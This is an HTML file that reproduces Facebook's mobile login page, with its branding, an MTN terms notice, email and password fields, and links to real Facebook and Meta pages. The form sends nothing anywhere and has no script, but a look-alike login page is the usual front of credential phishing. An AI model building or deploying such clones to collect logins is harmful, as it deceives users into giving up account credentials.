<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="language">English (UK)</div>
        <div class="logo">
            <img src="facebook.png" alt="Facebook Logo">
        </div>
        <hr class="separator">
        <div class="terms">
            By proceeding, you agree to <span class="mtn">MTN's Terms</span>, which includes letting Facebook request and receive your phone number. 
            <span class="settings">Change settings</span>
        </div>
        <hr class="separator">
        <form class="login-form">
            <input type="text" placeholder="Mobile number or email address" class="input-field">
            <input type="password" placeholder="Password" class="input-field">
            <button type="button" class="login-button">Log In</button>
        </form>
        <div class="forgot-password">
            <a href="https://m.facebook.com/login/identify">Forgotten Password?</a>
        </div>
        <div class="create-account">
    <a href="https://m.facebook.com/reg/" class="create-button-link">
        <button type="button" class="create-button">Create new account</button>
       </a>
     </div>
        <div class="favicon">
            <img src="meta.png" alt="Favicon">
        </div>
        <div class="footer-links">
            <a href="https://about.meta.com">About</a>
            <a href="https://web.facebook.com/business/help">Help</a>
            <a href="https://web.facebook.com/policies_center">Terms</a>
        </div>
    </div>
</body>
</html>
